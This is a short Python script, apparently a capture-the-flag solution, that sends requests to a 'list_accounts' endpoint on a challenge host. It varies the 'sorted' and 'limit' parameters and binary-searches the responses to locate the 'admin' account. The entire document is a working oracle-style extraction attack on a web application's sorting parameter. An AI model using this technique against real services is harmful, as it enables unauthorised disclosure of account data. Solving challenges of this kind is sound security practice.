import requests

URL = "https://luaas.hackthesystem.pro/list_accounts/"


def req(sorted, limit, url=URL):
    res = requests.get(url, params={
        "sorted": sorted,
        "limit": limit,
    })
    return res.text

def binary_search(target="admin"):
    low = 0
    high = 128
    while (low <= high):
        mid = (high+low) / 2
        r = req("user.username.1", round(mid))
        print(round(mid))
        if target in r:
            high = mid - 1
        else:
            low = mid + 1
    return mid

# print(req("user.username.0", 10))
print(binary_search())
